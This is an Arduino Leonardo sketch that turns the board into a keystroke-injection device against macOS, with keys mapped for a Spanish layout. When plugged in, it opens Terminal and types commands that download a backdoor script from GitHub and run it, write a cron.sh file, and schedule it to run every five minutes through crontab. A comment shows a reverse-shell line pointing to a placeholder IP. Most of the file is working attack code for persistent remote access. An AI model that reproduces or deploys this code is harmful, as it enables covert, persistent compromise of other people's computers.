// OSX USB Hacking Device to use with an Arduino Leonardo Board
// By Angel Diaz (https://twitter.com/angeldiazibarra)

// Adapted for Spanish keyboard layout

#define LED_PIN 13 // Built in circuit LED

#define KEY_LEFT_CTRL     0x80
#define KEY_LEFT_SHIFT    0x81
#define KEY_LEFT_ALT      0x82
#define KEY_LEFT_GUI      0x83
#define KEY_RIGHT_CTRL    0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT     0x86
#define KEY_RIGHT_GUI     0x87

void setup()
{
  // wait a little to connect up
  delay(500);

  Keyboard.begin();
 
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // now open Terminal and open new Terminal tab
  openapp("termi");
  cmd(116); // cmd + t
  delay(500);
  
  // Create a cron which opens a backdoor

  // typeln("rm /Library/Caches/cron.sh");
  Keyboard.print("rm "); 
  typefolderroute();
  typeln("cron.sh");

  // typeln("vi /Library/Caches/cron.sh");
  Keyboard.print("vi "); 
  typefolderroute();
  typeln("cron.sh");
  
  Keyboard.print("i");
  
  // typeln("#!/bin/bash");
  alt(51); shift(49); shift(55);
  Keyboard.print("bin"); shift(55);
  typeln("bash");

  // Open a reverse Shell connection to your IP (listen with netcat)
  // typeln("bash -i >& /dev/tcp/XXX.XX.XX.XX/1337 0>&1");
  
  // For further reading:
  // https://null-byte.wonderhowto.com/how-to/create-backdoor-osx-0162551/
  // https://scriptingosx.com/2017/07/ssh-tunnels/
  // https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/

  // Delete any existing backdoor.sh file
  // typeln("rm /Library/Caches/backdoor.sh");
  Keyboard.print("rm ");
  typefolderroute();
  typeln("backdoor.sh");
  
  // Sync the latest backdoor.sh file from our repo
  // typeln("curl -O https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/backdoor.sh /Library/Caches/backdoor.sh");
  Keyboard.print("curl "); Keyboard.write(47); Keyboard.print("O ");
  Keyboard.print("https"); shift(46); shift(55); shift(55);
  Keyboard.print("raw.githubusercontent.com"); shift(55);
  Keyboard.print("angeldiazibarra"); shift(55);
  Keyboard.print("osx"); Keyboard.write(47); Keyboard.print("usb"); Keyboard.write(47); Keyboard.print("hack"); Keyboard.write(47); Keyboard.print("arduino"); shift(55);
  Keyboard.print("master"); shift(55);
  Keyboard.print("backdoor.sh "); 
  typefolderroute();
  typeln("backdoor.sh");

  // Execute backdoor.sh file
  Keyboard.print("sh ");
  typefolderroute();
  typeln("backdoor.sh");

  writeandsave();

  // Create a cron task to execute cron.sh every 5 minutes
  // typeln("crontab -e");
  Keyboard.print("crontab "); Keyboard.write(47); typeln("e");
  // Insert mode
  Keyboard.print("i");
  // typeln("*/5 * * * * cd /Library/Caches && sh cron.sh > /Library/Caches/cron.log 2>&1");
  Keyboard.write(125); shift(55); Keyboard.print("5 ");
  Keyboard.write(125); Keyboard.print(" "); Keyboard.write(125); Keyboard.print(" "); Keyboard.write(125); Keyboard.print(" "); Keyboard.write(125); Keyboard.print(" cd ");
  typefolderroute(); Keyboard.print(" "); Keyboard.write(94); Keyboard.write(94); typeln(" sh cron.sh");
  
  writeandsave();
  
  // Close terminal window
  cmd(113); // cmd + q
}

void writeandsave(){
  // Write and save in vim
  Keyboard.write(KEY_ESC);
  Keyboard.write(KEY_ESC);
  shift(46); typeln("w"); // typeln(":w");
  shift(46); typeln("q"); // typeln(":q");
}

void typefolderroute(){
  shift(55);
  Keyboard.print("Library");
  shift(55);
  Keyboard.print("Caches");
  shift(55);
}

void shift(int key){
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void alt(int key){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void cmd(int key){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void openapp(String app){
  // CMD + Space to open Spotlight
  cmd(32);
  delay(50);
    
  typeln(app);
  delay(200);
}


// type a string (pressing enter at the end)
// you can add extra delays so you can see what's happening
void typeln(String chars)
{
  Keyboard.print(chars);
  // delay(50);
  Keyboard.write(176);
  delay(250);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(250);
  digitalWrite(LED_PIN, LOW);
  delay(250);
}
